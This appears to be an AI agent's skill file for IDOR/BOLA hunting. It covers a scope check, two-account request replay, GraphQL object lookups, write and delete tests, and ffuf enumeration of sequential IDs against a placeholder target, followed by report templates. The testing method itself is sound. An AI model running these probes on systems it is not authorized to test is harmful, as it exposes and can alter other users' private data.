---
name: hunt-idor
description: IDOR / BOLA hunting - two-account methodology, sequential ID enumeration, GraphQL node IDOR, write/delete operations. Wiki-first, FIND schema output.
---

# Hunt: IDOR / Broken Object Level Authorization

## Pre-Attack: Wiki Query (MANDATORY)
```
qmd_query "IDOR insecure direct object reference access control" via wiki-search MCP -> read matching technique page if found.
```
Apply known patterns and GraphQL IDOR techniques already documented. Payload arsenal: `wiki/payloads/idor.md`. See [[uuid-insecurities]] for the v1-UUID timestamp/MAC sandwich attack when an object ID is a UUID rather than a sequential integer.


**Self-heal:** If the wiki query returns nothing, create a stub `wiki/techniques/<area>/<slug>.md` (frontmatter + a `## Observed during <engagement>` section built from your findings) before proceeding, so the gap fills instead of silently recurring.

## Scope Check
- Confirm target is in scope
- Read Deadends.md - skip paths already marked exhausted

## Attack Surface Signals
URL patterns: `/api/v1/users/{id}`, `/invoices?id=`, `/reports/{uuid}/`, `/messages/{thread_id}`, `/admin/orgs/{org_id}/members`

GraphQL: any query/mutation taking an `id` argument. Check for `node(id: "...")` global ID lookups.

## Methodology
**Setup:** Create two accounts (User A = resource owner, User B = attacker).

1. Log in as User A - browse every feature - note all IDs (object IDs, UUIDs, org IDs, invoice IDs)
2. Log in as User B - replace session token
3. Replay User A's resource IDs using User B's session:
```bash
# User A owns resource
curl -s -H "Cookie: session=USER_A_SESSION" https://target.com/api/v1/invoices/12345

# User B attempts access
curl -s -H "Cookie: session=USER_B_SESSION" https://target.com/api/v1/invoices/12345
# 200 OK with User A's data = IDOR confirmed
```
4. Test ALL HTTP verbs: GET, POST, PUT, PATCH, DELETE
5. Test cross-tenant: create accounts in separate orgs, test if Org B accesses Org A IDs
6. Test GraphQL:
```bash
curl -s -X POST https://target.com/graphql \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ billingDocument(id: \"USER_A_DOC_ID\") { id amount pdfUrl } }"}'
```
7. Test write/delete: can User B DELETE User A's resources? MODIFY User A's content?
8. Enumerate sequential IDs:
```bash
# Generate range around known ID
python3 -c "
known=48291
[print(i) for i in range(known-500, known+500)]
" > ids.txt

ffuf -c -u "https://target.com/api/v1/orders/FUZZ" \
  -w ids.txt -H "Authorization: Bearer USER_B_TOKEN" -mc 200
```
9. **Distill to wiki (when confirmed):** if the finding is a reusable GraphQL IDOR or UUID-bypass technique, stage a GENERIC wiki candidate now (no client host): `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/access-control.md`. Promote later via `scripts/wiki-promote.py`.

## FIND Output

If confirmed (User B receives User A's data):
```
Create Vulns/Research/FIND-XXX-SEVERITY-idor-<host>-<resource>.md
Severity: HIGH if financial/PII data, admin escalation; MEDIUM if non-critical user data; LOW if non-sensitive
Add row to Vuln-index.md
```

If path exhausted:
```
Append to Deadends.md: - [ ] IDOR on <host> <endpoint> -- 403/404 on cross-account, authorization enforced
```

Report: Status + files created.
